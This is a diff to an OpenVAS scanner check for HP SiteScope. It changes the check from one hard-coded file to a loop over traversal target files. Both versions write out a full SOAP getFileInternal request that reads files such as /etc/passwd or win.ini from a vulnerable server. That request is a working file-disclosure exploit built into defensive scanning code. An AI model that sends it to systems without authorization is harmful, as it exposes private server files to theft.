@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_hp_sitescope_mult_vuln.nasl 11025 2018-08-17 08:27:37Z cfischer $
+# $Id: gb_hp_sitescope_mult_vuln.nasl 11747 2018-10-04 09:58:33Z jschulte $
 #
 # HP SiteScope Multiple Vulnerabilities
 #
@@ -30,8 +30,8 @@ CPE = "cpe:/a:hp:sitescope";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.106881");
-  script_version("$Revision: 11025 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-08-17 10:27:37 +0200 (Fri, 17 Aug 2018) $");
+  script_version("$Revision: 11747 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-04 11:58:33 +0200 (Thu, 04 Oct 2018) $");
   script_tag(name:"creation_date", value:"2017-06-19 10:42:13 +0700 (Mon, 19 Jun 2017)");
   script_tag(name:"cvss_base", value:"7.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
@@ -128,43 +128,45 @@ if (isnull(hostname[1]))
 else
   hostname = hostname[1];
 
-if (host_runs("Windows") == "yes")
-  file = "c:\\windows\\win.ini";
-else
-  file = "/etc/passwd";
+files = traversal_files();
 
-soap = string("<?xml version='1.0' encoding='UTF-8'?>\r\n",
-              "<wsns0:Envelope\r\n",
-              "xmlns:wsns1='http://www.w3.org/2001/XMLSchema-instance'\r\n",
-              "xmlns:xsd='http://www.w3.org/2001/XMLSchema'\r\n",
-              "xmlns:wsns0='http://schemas.xmlsoap.org/soap/envelope/'\r\n",
-              ">\r\n",
-              "<wsns0:Body\r\n",
-              "wsns0:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'\r\n",
-              ">\r\n",
-              "<impl:getFileInternal\r\n",
-              "xmlns:impl='http://Api.freshtech.COM'\r\n",
-              ">\r\n",
-              "<in0\r\n",
-              "xsi:type='xsd:string'\r\n",
-              "xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'\r\n",
-              ">", hostname, "</in0>\r\n",
-              "<in1\r\n",
-              "xsi:type='xsd:string'\r\n",
-              "xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'\r\n",
-              ">", file, "</in1>\r\n",
-              "</impl:getFileInternal>\r\n",
-              "</wsns0:Body>\r\n",
-              "</wsns0:Envelope>");
+foreach pattern(keys(files)) {
 
-req = http_post_req(port: port, url: url, data: soap,
-                    add_headers: make_array("SoapAction", '""', "Content-Type", "text/xml; charset=UTF-8"));
-res = http_keepalive_send_recv(port: port, data: req);
+  file = files[pattern];
 
-if ("boundary=" >< res && '<getFileInternalReturn href="cid:' >< res) {
-  report = "It was possible to retrieve the file " + file;
-  security_message(port: port, data: report);
-  exit(0);
+  soap = string("<?xml version='1.0' encoding='UTF-8'?>\r\n",
+                "<wsns0:Envelope\r\n",
+                "xmlns:wsns1='http://www.w3.org/2001/XMLSchema-instance'\r\n",
+                "xmlns:xsd='http://www.w3.org/2001/XMLSchema'\r\n",
+                "xmlns:wsns0='http://schemas.xmlsoap.org/soap/envelope/'\r\n",
+                ">\r\n",
+                "<wsns0:Body\r\n",
+                "wsns0:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'\r\n",
+                ">\r\n",
+                "<impl:getFileInternal\r\n",
+                "xmlns:impl='http://Api.freshtech.COM'\r\n",
+                ">\r\n",
+                "<in0\r\n",
+                "xsi:type='xsd:string'\r\n",
+                "xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'\r\n",
+                ">", hostname, "</in0>\r\n",
+                "<in1\r\n",
+                "xsi:type='xsd:string'\r\n",
+                 "xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'\r\n",
+                ">", file, "</in1>\r\n",
+                "</impl:getFileInternal>\r\n",
+                "</wsns0:Body>\r\n",
+                "</wsns0:Envelope>");
+
+  req = http_post_req(port: port, url: url, data: soap,
+                      add_headers: make_array("SoapAction", '""', "Content-Type", "text/xml; charset=UTF-8"));
+  res = http_keepalive_send_recv(port: port, data: req);
+
+  if ("boundary=" >< res && '<getFileInternalReturn href="cid:' >< res) {
+    report = "It was possible to retrieve the file " + file;
+    security_message(port: port, data: report);
+    exit(0);
+  }
 }
 
-exit(0);
+exit(99);
